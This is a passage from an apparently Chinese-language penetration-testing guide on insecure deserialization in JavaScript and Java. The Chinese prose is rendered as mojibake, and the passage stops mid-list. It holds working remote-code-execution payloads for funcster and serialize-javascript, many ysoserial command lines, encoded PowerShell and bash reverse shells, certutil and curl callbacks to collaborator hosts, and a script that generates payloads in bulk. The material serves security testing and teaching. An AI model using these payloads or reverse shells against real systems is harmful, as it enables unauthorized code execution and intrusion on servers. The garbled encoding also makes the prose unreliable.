<p><strong>funcster</strong> çš„ä¸€ä¸ªæ˜¾è‘—ç‰¹ç‚¹æ˜¯ <strong>æ ‡å‡†å†…ç½®å¯¹è±¡</strong> çš„ä¸å¯è®¿é—®æ€§ï¼›å®ƒä»¬è¶…å‡ºäº†å¯è®¿é—®èŒƒå›´ã€‚æ­¤é™åˆ¶é˜»æ­¢äº†å°è¯•åœ¨å†…ç½®å¯¹è±¡ä¸Šè°ƒç”¨æ–¹æ³•çš„ä»£ç æ‰§è¡Œï¼Œå½“ä½¿ç”¨ <code>console.log()</code> æˆ– <code>require(something)</code> ç­‰å‘½ä»¤æ—¶ï¼Œä¼šå¯¼è‡´ <code>"ReferenceError: console is not defined"</code> ç­‰å¼‚å¸¸ã€‚</p>
<p>å°½ç®¡æœ‰æ­¤é™åˆ¶ï¼Œä½†é€šè¿‡ç‰¹å®šæ–¹æ³•å¯ä»¥æ¢å¤å¯¹å…¨å±€ä¸Šä¸‹æ–‡çš„å®Œå…¨è®¿é—®ï¼ŒåŒ…æ‹¬æ‰€æœ‰æ ‡å‡†å†…ç½®å¯¹è±¡ã€‚é€šè¿‡ç›´æ¥åˆ©ç”¨å…¨å±€ä¸Šä¸‹æ–‡ï¼Œå¯ä»¥ç»•è¿‡æ­¤é™åˆ¶ã€‚ä¾‹å¦‚ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹ä»£ç ç‰‡æ®µé‡æ–°å»ºç«‹è®¿é—®ï¼š</p>
<pre><code class="language-javascript">funcster = require("funcster");
//Serialization
var test = funcster.serialize(function() { return "Hello world!" })
console.log(test) // { __js_function: 'function(){return"Hello world!"}' }

//Deserialization with auto-execution
var desertest1 = { __js_function: 'function(){return "Hello world!"}()' }
funcster.deepDeserialize(desertest1)
var desertest2 = { __js_function: 'this.constructor.constructor("console.log(1111)")()' }
funcster.deepDeserialize(desertest2)
var desertest3 = { __js_function: 'this.constructor.constructor("require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });")()' }
funcster.deepDeserialize(desertest3)
</code></pre>
<p><strong>æœ‰å…³</strong><a href="https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/"> <strong>æ›´å¤šä¿¡æ¯è¯·é˜…è¯»æ­¤æ¥æº</strong></a><strong>.</strong></p>
<h3 id="serialize-javascript"><a class="header" href="#serialize-javascript"><a href="https://www.npmjs.com/package/serialize-javascript"><strong>serialize-javascript</strong></a></a></h3>
<p><strong>serialize-javascript</strong> åŒ…ä¸“é—¨ç”¨äºåºåˆ—åŒ–ç›®çš„ï¼Œç¼ºä¹ä»»ä½•å†…ç½®çš„ååºåˆ—åŒ–åŠŸèƒ½ã€‚ç”¨æˆ·éœ€è‡ªè¡Œå®ç°ååºåˆ—åŒ–çš„æ–¹æ³•ã€‚å®˜æ–¹ç¤ºä¾‹å»ºè®®ç›´æ¥ä½¿ç”¨ <code>eval</code> æ¥ååºåˆ—åŒ–åºåˆ—åŒ–çš„æ•°æ®ï¼š</p>
<pre><code class="language-javascript">function deserialize(serializedJavascript){
return eval('(' + serializedJavascript + ')');
}
</code></pre>
<p>å¦‚æœè¿™ä¸ªå‡½æ•°ç”¨äºååºåˆ—åŒ–å¯¹è±¡ï¼Œä½ å¯ä»¥<strong>è½»æ¾åˆ©ç”¨å®ƒ</strong>ï¼š</p>
<pre><code class="language-javascript">var serialize = require('serialize-javascript');
//Serialization
var test = serialize(function() { return "Hello world!" });
console.log(test) //function() { return "Hello world!" }

//Deserialization
var test = "function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"
deserialize(test)
</code></pre>
<p><strong>æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·é˜…è¯»æ­¤æ¥æº</strong><a href="https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/"> <strong>æ›´å¤šä¿¡æ¯è¯»è¿™ä¸ªæ¥æº</strong></a><strong>.</strong></p>
<h3 id="cryoåº“"><a class="header" href="#cryoåº“">Cryoåº“</a></h3>
<p>åœ¨ä»¥ä¸‹é¡µé¢ä¸­ï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°æœ‰å…³å¦‚ä½•æ»¥ç”¨æ­¤åº“ä»¥æ‰§è¡Œä»»æ„å‘½ä»¤çš„ä¿¡æ¯ï¼š</p>
<ul>
<li><a href="https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/">https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/</a></li>
<li><a href="https://hackerone.com/reports/350418">https://hackerone.com/reports/350418</a></li>
</ul>
<h2 id="java---http"><a class="header" href="#java---http">Java - HTTP</a></h2>
<p>åœ¨Javaä¸­ï¼Œ<strong>ååºåˆ—åŒ–å›è°ƒåœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­æ‰§è¡Œ</strong>ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸€æ‰§è¡Œè¿‡ç¨‹ï¼Œé€šè¿‡æ„é€ æ¶æ„æœ‰æ•ˆè´Ÿè½½æ¥è§¦å‘è¿™äº›å›è°ƒï¼Œä»è€Œå¯¼è‡´æ½œåœ¨çš„æœ‰å®³æ“ä½œæ‰§è¡Œã€‚</p>
<h3 id="æŒ‡çº¹"><a class="header" href="#æŒ‡çº¹">æŒ‡çº¹</a></h3>
<h4 id="ç™½ç›’"><a class="header" href="#ç™½ç›’">ç™½ç›’</a></h4>
<p>è¦è¯†åˆ«ä»£ç åº“ä¸­æ½œåœ¨çš„åºåˆ—åŒ–æ¼æ´ï¼Œè¯·æœç´¢ï¼š</p>
<ul>
<li>å®ç°äº†<code>Serializable</code>æ¥å£çš„ç±»ã€‚</li>
<li>ä½¿ç”¨<code>java.io.ObjectInputStream</code>ã€<code>readObject</code>ã€<code>readUnshare</code>å‡½æ•°ã€‚</li>
</ul>
<p>ç‰¹åˆ«æ³¨æ„ï¼š</p>
<ul>
<li><code>XMLDecoder</code>ä¸å¤–éƒ¨ç”¨æˆ·å®šä¹‰çš„å‚æ•°ä¸€èµ·ä½¿ç”¨ã€‚</li>
<li><code>XStream</code>çš„<code>fromXML</code>æ–¹æ³•ï¼Œç‰¹åˆ«æ˜¯å½“XStreamç‰ˆæœ¬å°äºæˆ–ç­‰äº1.46æ—¶ï¼Œå› ä¸ºå®ƒå®¹æ˜“å—åˆ°åºåˆ—åŒ–é—®é¢˜çš„å½±å“ã€‚</li>
<li>ä¸<code>readObject</code>æ–¹æ³•ç»“åˆä½¿ç”¨çš„<code>ObjectInputStream</code>ã€‚</li>
<li>å®ç°<code>readObject</code>ã€<code>readObjectNodData</code>ã€<code>readResolve</code>æˆ–<code>readExternal</code>ç­‰æ–¹æ³•ã€‚</li>
<li><code>ObjectInputStream.readUnshared</code>ã€‚</li>
<li>ä¸€èˆ¬ä½¿ç”¨<code>Serializable</code>ã€‚</li>
</ul>
<h4 id="é»‘ç›’"><a class="header" href="#é»‘ç›’">é»‘ç›’</a></h4>
<p>å¯¹äºé»‘ç›’æµ‹è¯•ï¼Œå¯»æ‰¾ç‰¹å®šçš„<strong>ç­¾åæˆ–â€œé­”æ³•å­—èŠ‚â€</strong>ï¼Œä»¥è¡¨ç¤ºæ¥è‡ª<code>ObjectInputStream</code>çš„Javaåºåˆ—åŒ–å¯¹è±¡ï¼š</p>
<ul>
<li>åå…­è¿›åˆ¶æ¨¡å¼ï¼š<code>AC ED 00 05</code>ã€‚</li>
<li>Base64æ¨¡å¼ï¼š<code>rO0</code>ã€‚</li>
<li>HTTPå“åº”å¤´ä¸­<code>Content-type</code>è®¾ç½®ä¸º<code>application/x-java-serialized-object</code>ã€‚</li>
<li>è¡¨ç¤ºå…ˆå‰å‹ç¼©çš„åå…­è¿›åˆ¶æ¨¡å¼ï¼š<code>1F 8B 08 00</code>ã€‚</li>
<li>è¡¨ç¤ºå…ˆå‰å‹ç¼©çš„Base64æ¨¡å¼ï¼š<code>H4sIA</code>ã€‚</li>
<li>å…·æœ‰<code>.faces</code>æ‰©å±•åçš„Webæ–‡ä»¶å’Œ<code>faces.ViewState</code>å‚æ•°ã€‚åœ¨Webåº”ç”¨ç¨‹åºä¸­å‘ç°è¿™äº›æ¨¡å¼åº”æç¤ºè¿›è¡Œè¯¦ç»†æ£€æŸ¥ï¼Œå¦‚<a href="java-jsf-viewstate-.faces-deserialization.html">å…³äºJava JSF ViewStateååºåˆ—åŒ–çš„å¸–å­</a>ä¸­æ‰€è¿°ã€‚</li>
</ul>
<pre><code>javax.faces.ViewState=rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJwdAAML2xvZ2luLnhodG1s
</code></pre>
<h3 id="æ£€æŸ¥æ˜¯å¦å­˜åœ¨æ¼æ´"><a class="header" href="#æ£€æŸ¥æ˜¯å¦å­˜åœ¨æ¼æ´">æ£€æŸ¥æ˜¯å¦å­˜åœ¨æ¼æ´</a></h3>
<p>å¦‚æœä½ æƒ³è¦<strong>äº†è§£Javaååºåˆ—åŒ–æ¼æ´æ˜¯å¦‚ä½•å·¥ä½œçš„</strong>ï¼Œä½ åº”è¯¥æŸ¥çœ‹<a href="basic-java-deserialization-objectinputstream-readobject.html"><strong>åŸºæœ¬Javaååºåˆ—åŒ–</strong></a>ã€<a href="java-dns-deserialization-and-gadgetprobe.html"><strong>Java DNSååºåˆ—åŒ–</strong></a>å’Œ<a href="java-transformers-to-rutime-exec-payload.html"><strong>CommonsCollection1æœ‰æ•ˆè½½è·</strong></a>ã€‚</p>
<h4 id="ç™½ç›’æµ‹è¯•"><a class="header" href="#ç™½ç›’æµ‹è¯•">ç™½ç›’æµ‹è¯•</a></h4>
<p>ä½ å¯ä»¥æ£€æŸ¥æ˜¯å¦å®‰è£…äº†ä»»ä½•å…·æœ‰å·²çŸ¥æ¼æ´çš„åº”ç”¨ç¨‹åºã€‚</p>
<pre><code class="language-bash">find . -iname "*commons*collection*"
grep -R InvokeTransformer .
</code></pre>
<p>ä½ å¯ä»¥å°è¯•<strong>æ£€æŸ¥æ‰€æœ‰å·²çŸ¥çš„æ˜“å—æ”»å‡»çš„åº“</strong>ï¼Œå¹¶ä¸”<a href="https://github.com/frohoff/ysoserial"><strong>Ysoserial</strong></a>å¯ä»¥æä¾›ä¸€ä¸ªåˆ©ç”¨ã€‚æˆ–è€…ä½ å¯ä»¥æ£€æŸ¥<a href="https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#genson-json">Java-Deserialization-Cheat-Sheet</a>ä¸ŠæŒ‡ç¤ºçš„åº“ã€‚<br />
ä½ è¿˜å¯ä»¥ä½¿ç”¨<a href="https://github.com/JackOfMostTrades/gadgetinspector"><strong>gadgetinspector</strong></a>æ¥æœç´¢å¯èƒ½è¢«åˆ©ç”¨çš„gadgeté“¾ã€‚<br />
è¿è¡Œ<strong>gadgetinspector</strong>ï¼ˆåœ¨æ„å»ºåï¼‰æ—¶ï¼Œä¸å¿…åœ¨æ„å®ƒæ‰€ç»å†çš„å¤§é‡è­¦å‘Š/é”™è¯¯ï¼Œè®©å®ƒå®Œæˆã€‚å®ƒä¼šå°†æ‰€æœ‰å‘ç°å†™å…¥_gadgetinspector/gadget-results/gadget-chains-year-month-day-hore-min.txt_ã€‚è¯·æ³¨æ„ï¼Œ<strong>gadgetinspectorä¸ä¼šåˆ›å»ºä¸€ä¸ªåˆ©ç”¨ï¼Œå¹¶ä¸”å¯èƒ½ä¼šæŒ‡ç¤ºå‡é˜³æ€§</strong>ã€‚</p>
<h4 id="é»‘ç›’æµ‹è¯•"><a class="header" href="#é»‘ç›’æµ‹è¯•">é»‘ç›’æµ‹è¯•</a></h4>
<p>ä½¿ç”¨Burpæ‰©å±•<a href="java-dns-deserialization-and-gadgetprobe.html"><strong>gadgetprobe</strong></a>ï¼Œä½ å¯ä»¥è¯†åˆ«<strong>å“ªäº›åº“æ˜¯å¯ç”¨çš„</strong>ï¼ˆç”šè‡³åŒ…æ‹¬ç‰ˆæœ¬ï¼‰ã€‚æœ‰äº†è¿™äº›ä¿¡æ¯ï¼Œé€‰æ‹©ä¸€ä¸ªæœ‰æ•ˆè½½è·æ¥åˆ©ç”¨æ¼æ´å¯èƒ½ä¼š<strong>æ›´å®¹æ˜“</strong>ã€‚<br />
<a href="java-dns-deserialization-and-gadgetprobe.html#gadgetprobe"><strong>é˜…è¯»æ­¤æ–‡ä»¥äº†è§£æ›´å¤šå…³äºGadgetProbeçš„ä¿¡æ¯</strong></a><strong>ã€‚</strong><br />
GadgetProbeä¸“æ³¨äº**<code>ObjectInputStream</code>ååºåˆ—åŒ–**ã€‚</p>
<p>ä½¿ç”¨Burpæ‰©å±•<a href="java-dns-deserialization-and-gadgetprobe.html#java-deserialization-scanner"><strong>Java Deserialization Scanner</strong></a>ï¼Œä½ å¯ä»¥<strong>è¯†åˆ«å¯è¢«ysoserialåˆ©ç”¨çš„æ˜“å—æ”»å‡»åº“</strong>å¹¶<strong>åˆ©ç”¨</strong>å®ƒä»¬ã€‚<br />
<a href="java-dns-deserialization-and-gadgetprobe.html#java-deserialization-scanner"><strong>é˜…è¯»æ­¤æ–‡ä»¥äº†è§£æ›´å¤šå…³äºJava Deserialization Scannerçš„ä¿¡æ¯ã€‚</strong></a><br />
Java Deserialization Scannerä¸“æ³¨äº**<code>ObjectInputStream</code>**ååºåˆ—åŒ–ã€‚</p>
<p>ä½ è¿˜å¯ä»¥ä½¿ç”¨<a href="https://github.com/nccgroup/freddy"><strong>Freddy</strong></a>æ¥<strong>æ£€æµ‹Burpä¸­çš„ååºåˆ—åŒ–</strong>æ¼æ´ã€‚è¿™ä¸ªæ’ä»¶å°†æ£€æµ‹<strong>ä¸ä»…æ˜¯<code>ObjectInputStream</code><strong>ç›¸å…³çš„æ¼æ´ï¼Œè¿˜</strong>åŒ…æ‹¬</strong>æ¥è‡ª<strong>Json</strong>å’Œ<strong>Yml</strong>ååºåˆ—åŒ–åº“çš„æ¼æ´ã€‚åœ¨ä¸»åŠ¨æ¨¡å¼ä¸‹ï¼Œå®ƒå°†å°è¯•ä½¿ç”¨sleepæˆ–DNSæœ‰æ•ˆè½½è·æ¥ç¡®è®¤å®ƒä»¬ã€‚<br />
<a href="https://www.nccgroup.com/us/about-us/newsroom-and-events/blog/2018/june/finding-deserialisation-issues-has-never-been-easier-freddy-the-serialisation-killer/"><strong>ä½ å¯ä»¥åœ¨è¿™é‡Œæ‰¾åˆ°æ›´å¤šå…³äºFreddyçš„ä¿¡æ¯ã€‚</strong></a></p>
<p><strong>åºåˆ—åŒ–æµ‹è¯•</strong></p>
<p>å¹¶ä¸æ˜¯æ‰€æœ‰çš„äº‹æƒ…éƒ½åœ¨äºæ£€æŸ¥æœåŠ¡å™¨æ˜¯å¦ä½¿ç”¨äº†ä»»ä½•æ˜“å—æ”»å‡»çš„åº“ã€‚æœ‰æ—¶ä½ å¯ä»¥<strong>æ›´æ”¹åºåˆ—åŒ–å¯¹è±¡å†…éƒ¨çš„æ•°æ®å¹¶ç»•è¿‡æŸäº›æ£€æŸ¥</strong>ï¼ˆå¯èƒ½æˆäºˆä½ åœ¨webåº”ç”¨ç¨‹åºä¸­çš„ç®¡ç†å‘˜æƒé™ï¼‰ã€‚<br />
å¦‚æœä½ å‘ç°ä¸€ä¸ªjavaåºåˆ—åŒ–å¯¹è±¡è¢«å‘é€åˆ°webåº”ç”¨ç¨‹åºï¼Œ<strong>ä½ å¯ä»¥ä½¿ç”¨</strong><a href="https://github.com/NickstaDB/SerializationDumper"><strong>SerializationDumper</strong></a> <strong>ä»¥æ›´äººæ€§åŒ–çš„æ ¼å¼æ‰“å°å‘é€çš„åºåˆ—åŒ–å¯¹è±¡</strong>ã€‚çŸ¥é“ä½ å‘é€äº†å“ªäº›æ•°æ®å°†æ›´å®¹æ˜“ä¿®æ”¹å®ƒå¹¶ç»•è¿‡æŸäº›æ£€æŸ¥ã€‚</p>
<h3 id="åˆ©ç”¨"><a class="header" href="#åˆ©ç”¨"><strong>åˆ©ç”¨</strong></a></h3>
<h4 id="ysoserial"><a class="header" href="#ysoserial"><strong>ysoserial</strong></a></h4>
<p>åˆ©ç”¨Javaååºåˆ—åŒ–çš„ä¸»è¦å·¥å…·æ˜¯<a href="https://github.com/frohoff/ysoserial"><strong>ysoserial</strong></a>ï¼ˆ<a href="https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar"><strong>åœ¨è¿™é‡Œä¸‹è½½</strong></a>ï¼‰ã€‚ä½ ä¹Ÿå¯ä»¥è€ƒè™‘ä½¿ç”¨<a href="https://github.com/pimps/ysoserial-modified"><strong>ysoseral-modified</strong></a>ï¼Œè¿™å°†å…è®¸ä½ ä½¿ç”¨å¤æ‚çš„å‘½ä»¤ï¼ˆä¾‹å¦‚å¸¦ç®¡é“çš„å‘½ä»¤ï¼‰ã€‚<br />
è¯·æ³¨æ„ï¼Œè¿™ä¸ªå·¥å…·<strong>ä¸“æ³¨äº</strong>åˆ©ç”¨**<code>ObjectInputStream</code><strong>ã€‚<br />
æˆ‘ä¼š</strong>å…ˆä½¿ç”¨â€œURLDNSâ€<strong>æœ‰æ•ˆè½½è·</strong>å†ä½¿ç”¨RCE**æœ‰æ•ˆè½½è·æ¥æµ‹è¯•æ³¨å…¥æ˜¯å¦å¯èƒ½ã€‚æ— è®ºå¦‚ä½•ï¼Œè¯·æ³¨æ„â€œURLDNSâ€æœ‰æ•ˆè½½è·å¯èƒ½ä¸èµ·ä½œç”¨ï¼Œä½†å…¶ä»–RCEæœ‰æ•ˆè½½è·å¯èƒ½æœ‰æ•ˆã€‚</p>
<pre><code class="language-bash"># PoC to make the application perform a DNS req
java -jar ysoserial-master-SNAPSHOT.jar URLDNS http://b7j40108s43ysmdpplgd3b7rdij87x.burpcollaborator.net &gt; payload

# PoC RCE in Windows
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections5 'cmd /c ping -n 5 127.0.0.1' &gt; payload
# Time, I noticed the response too longer when this was used
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c timeout 5" &gt; payload
# Create File
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c echo pwned&gt; C:\\\\Users\\\\username\\\\pwn" &gt; payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c nslookup jvikwa34jwgftvoxdz16jhpufllb90.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c certutil -urlcache -split -f http://j4ops7g6mi9w30verckjrk26txzqnf.burpcollaborator.net/a a"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAYwBlADcAMABwAG8AbwB1ADAAaABlAGIAaQAzAHcAegB1AHMAMQB6ADIAYQBvADEAZgA3ADkAdgB5AC4AYgB1AHIAcABjAG8AbABsAGEAYgBvAHIAYQB0AG8AcgAuAG4AZQB0AC8AYQAnACkA"
## In the ast http request was encoded: IEX(New-Object Net.WebClient).downloadString('http://1ce70poou0hebi3wzus1z2ao1f79vy.burpcollaborator.net/a')
## To encode something in Base64 for Windows PS from linux you can use: echo -n "&lt;PAYLOAD&gt;" | iconv --to-code UTF-16LE | base64 -w0
# Reverse Shell
## Encoded: IEX(New-Object Net.WebClient).downloadString('http://192.168.1.4:8989/powercat.ps1')
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANAA6ADgAOQA4ADkALwBwAG8AdwBlAHIAYwBhAHQALgBwAHMAMQAnACkA"

#PoC RCE in Linux
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "ping -c 5 192.168.1.4" &gt; payload
# Time
## Using time in bash I didn't notice any difference in the timing of the response
# Create file
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "touch /tmp/pwn" &gt; payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "dig ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "nslookup ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "curl ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net" &gt; payload
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "wget ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# Reverse shell
## Encoded: bash -i &gt;&amp; /dev/tcp/127.0.0.1/4444 0&gt;&amp;1
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}" | base64 -w0
## Encoded: export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,ZXhwb3J0IFJIT1NUPSIxMjcuMC4wLjEiO2V4cG9ydCBSUE9SVD0xMjM0NTtweXRob24gLWMgJ2ltcG9ydCBzeXMsc29ja2V0LG9zLHB0eTtzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKG9zLmdldGVudigiUkhPU1QiKSxpbnQob3MuZ2V0ZW52KCJSUE9SVCIpKSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZmQpIGZvciBmZCBpbiAoMCwxLDIpXTtwdHkuc3Bhd24oIi9iaW4vc2giKSc=}|{base64,-d}|{bash,-i}"

# Base64 encode payload in base64
base64 -w0 payload
</code></pre>
<p>å½“ä¸º <strong>java.lang.Runtime.exec()</strong> åˆ›å»ºæœ‰æ•ˆè´Ÿè½½æ—¶ï¼Œæ‚¨ <strong>ä¸èƒ½ä½¿ç”¨ç‰¹æ®Šå­—ç¬¦</strong> å¦‚ "&gt;" æˆ– "|" æ¥é‡å®šå‘æ‰§è¡Œçš„è¾“å‡ºï¼Œä¸èƒ½ä½¿ç”¨ "$()" æ¥æ‰§è¡Œå‘½ä»¤ï¼Œç”šè‡³ä¸èƒ½ <strong>é€šè¿‡ç©ºæ ¼</strong> åˆ†éš”æ¥ä¼ é€’å‘½ä»¤å‚æ•°ï¼ˆæ‚¨å¯ä»¥æ‰§è¡Œ <code>echo -n "hello world"</code> ä½†ä¸èƒ½æ‰§è¡Œ <code>python2 -c 'print "Hello world"'</code>ï¼‰ã€‚ä¸ºäº†æ­£ç¡®ç¼–ç æœ‰æ•ˆè´Ÿè½½ï¼Œæ‚¨å¯ä»¥ <a href="http://www.jackson-t.ca/runtime-exec-payloads.html">ä½¿ç”¨è¿™ä¸ªç½‘é¡µ</a>ã€‚</p>
<p>è¯·éšæ„ä½¿ç”¨ä¸‹ä¸€ä¸ªè„šæœ¬æ¥åˆ›å»º <strong>æ‰€æœ‰å¯èƒ½çš„ä»£ç æ‰§è¡Œ</strong> æœ‰æ•ˆè´Ÿè½½ï¼Œé€‚ç”¨äº Windows å’Œ Linuxï¼Œç„¶ååœ¨æ˜“å—æ”»å‡»çš„ç½‘é¡µä¸Šè¿›è¡Œæµ‹è¯•ï¼š</p>
<pre><code class="language-python">import os
import base64

# You may need to update the payloads
payloads = ['BeanShell1', 'Clojure', 'CommonsBeanutils1', 'CommonsCollections1', 'CommonsCollections2', 'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 'CommonsCollections7', 'Groovy1', 'Hibernate1', 'Hibernate2', 'JBossInterceptors1', 'JRMPClient', 'JSON1', 'JavassistWeld1', 'Jdk7u21', 'MozillaRhino1', 'MozillaRhino2', 'Myfaces1', 'Myfaces2', 'ROME', 'Spring1', 'Spring2', 'Vaadin1', 'Wicket1']
def generate(name, cmd):
for payload in payloads:
final = cmd.replace('REPLACE', payload)
print 'Generating ' + payload + ' for ' + name + '...'
command = os.popen('java -jar ysoserial.jar ' + payload + ' "' + final + '"')
result = command.read()
command.close()
encoded = base64.b64encode(result)
if encoded != "":
open(name + '_intruder.txt', 'a').write(encoded + '\n')

generate('Windows', 'ping -n 1 win.REPLACE.server.local')
generate('Linux', 'ping -c 1 nix.REPLACE.server.local')
</code></pre>
<h4 id="serialkillerbypassgadgets"><a class="header" href="#serialkillerbypassgadgets">serialkillerbypassgadgets</a></h4>
<p>æ‚¨å¯ä»¥<strong>ä½¿ç”¨</strong> <a href="https://github.com/pwntester/SerialKillerBypassGadgetCollection"><strong>https://github.com/pwntester/SerialKillerBypassGadgetCollection</strong></a> <strong>ä¸ ysoserial ä¸€èµ·åˆ›å»ºæ›´å¤šæ¼æ´åˆ©ç”¨</strong>ã€‚æœ‰å…³æ­¤å·¥å…·çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚è§<strong>æ¼”è®²çš„å¹»ç¯ç‰‡</strong>ï¼Œè¯¥å·¥å…·åœ¨å…¶ä¸­ä»‹ç»ï¼š<a href="https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next_slideshow=1">https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next_slideshow=1</a></p>
<h4 id="marshalsec"><a class="header" href="#marshalsec">marshalsec</a></h4>
<p><a href="https://github.com/mbechler/marshalsec"><strong>marshalsec</strong> </a>å¯ç”¨äºç”Ÿæˆæœ‰æ•ˆè½½è·ï¼Œä»¥åˆ©ç”¨ Java ä¸­ä¸åŒçš„<strong>Json</strong>å’Œ<strong>Yml</strong>åºåˆ—åŒ–åº“ã€‚<br />
ä¸ºäº†ç¼–è¯‘è¯¥é¡¹ç›®ï¼Œæˆ‘éœ€è¦<strong>æ·»åŠ </strong>è¿™äº›<strong>ä¾èµ–é¡¹</strong>åˆ° <code>pom.xml</code>ï¼š</p>
<pre><code class="language-markup">&lt;dependency&gt;
&lt;groupId&gt;javax.activation&lt;/groupId&gt;
&lt;artifactId&gt;activation&lt;/artifactId&gt;
&lt;version&gt;1.1.1&lt;/version&gt;
&lt;/dependency&gt;

&lt;dependency&gt;
&lt;groupId&gt;com.sun.jndi&lt;/groupId&gt;
&lt;artifactId&gt;rmiregistry&lt;/artifactId&gt;
&lt;version&gt;1.2.1&lt;/version&gt;
&lt;type&gt;pom&lt;/type&gt;
&lt;/dependency&gt;
</code></pre>
<p><strong>å®‰è£… maven</strong>ï¼Œå¹¶ <strong>ç¼–è¯‘</strong> é¡¹ç›®ï¼š</p>
<pre><code class="language-bash">sudo apt-get install maven
mvn clean package -DskipTests
</code></pre>
<h4 id="fastjson"><a class="header" href="#fastjson">FastJSON</a></h4>
<p>é˜…è¯»æ›´å¤šå…³äºè¿™ä¸ªJava JSONåº“çš„ä¿¡æ¯: <a href="https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html">https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html</a></p>
<h3 id="labs"><a class="header" href="#labs">Labs</a></h3>
<ul>
<li>å¦‚æœä½ æƒ³æµ‹è¯•ä¸€äº›ysoserialæœ‰æ•ˆè½½è·ï¼Œä½ å¯ä»¥<strong>è¿è¡Œè¿™ä¸ªwebåº”ç”¨</strong>: <a href="https://github.com/hvqzao/java-deserialize-webapp">https://github.com/hvqzao/java-deserialize-webapp</a></li>
<li><a href="https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/">https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/</a></li>
</ul>
<h3 id="why"><a class="header" href="#why">Why</a></h3>
<p>Javaåœ¨å„ç§ç›®çš„ä¸Šä½¿ç”¨äº†å¤§é‡çš„åºåˆ—åŒ–ï¼Œä¾‹å¦‚ï¼š</p>
<ul>
<li><strong>HTTPè¯·æ±‚</strong>: åºåˆ—åŒ–å¹¿æ³›åº”ç”¨äºå‚æ•°ã€ViewStateã€cookiesç­‰çš„ç®¡ç†ã€‚</li>
<li><strong>RMI (è¿œç¨‹æ–¹æ³•è°ƒç”¨)</strong>: Java RMIåè®®å®Œå…¨ä¾èµ–äºåºåˆ—åŒ–ï¼Œæ˜¯Javaåº”ç”¨ç¨‹åºè¿œç¨‹é€šä¿¡çš„åŸºçŸ³ã€‚</li>
<li><strong>RMI over HTTP</strong>: è¿™ç§æ–¹æ³•é€šå¸¸è¢«åŸºäºJavaçš„åšå®¢æˆ·ç«¯webåº”ç”¨ç¨‹åºä½¿ç”¨ï¼Œåˆ©ç”¨åºåˆ—åŒ–è¿›è¡Œæ‰€æœ‰å¯¹è±¡é€šä¿¡ã€‚</li>
